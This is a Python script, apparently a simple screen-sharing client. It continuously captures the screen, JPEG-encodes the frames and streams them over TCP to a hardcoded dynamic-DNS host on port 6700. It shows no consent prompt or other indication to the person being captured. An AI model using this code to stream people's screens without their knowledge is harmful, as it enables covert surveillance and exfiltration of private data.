import socket
import cv2
import numpy as np
import pyautogui
import struct
import threading
import time
from queue import Queue

# Queue for storing encoded images
frame_queue = Queue(maxsize=10)

def capture_screen():
    """Capture the screen and return it as a frame."""
    screen = pyautogui.screenshot()
    frame = np.array(screen)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    return frame

def capture_thread():
    capture_interval = 0.033  # Reduce to capture 3 times faster (1/3 of 0.1 seconds)
    while True:
        try:
            # Capture the screen
            frame = capture_screen()

            # Encode the frame as JPEG
            _, img_encoded = cv2.imencode('.jpg', frame)
            data = img_encoded.tobytes()

            # Put the encoded data into the queue
            if not frame_queue.full():
                frame_queue.put(data)
            else:
                print("Queue is full, dropping frame.")
            
            # Wait a bit before capturing the next frame
            time.sleep(capture_interval)
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            break

def send_thread(client_socket):
    while True:
        try:
            if not frame_queue.empty():
                # Get the encoded data from the queue
                data = frame_queue.get()

                # Send the size of the data first
                client_socket.sendall(struct.pack("L", len(data)))

                # Send the actual data
                client_socket.sendall(data)
            else:
                time.sleep(0.01)  # Wait a bit if the queue is empty
        except Exception as e:
            print(f"Error sending data: {e}")
            break

def main():
    SERVER_IP = '2b2tcracked.ddns.net'  # Replace with the server's IP address
    SERVER_PORT = 6700

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))

        # Start threads for capturing and sending
        capture_thread_instance = threading.Thread(target=capture_thread, daemon=True)
        send_thread_instance = threading.Thread(target=send_thread, args=(client_socket,), daemon=True)

        capture_thread_instance.start()
        send_thread_instance.start()

        capture_thread_instance.join()
        send_thread_instance.join()
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting...")
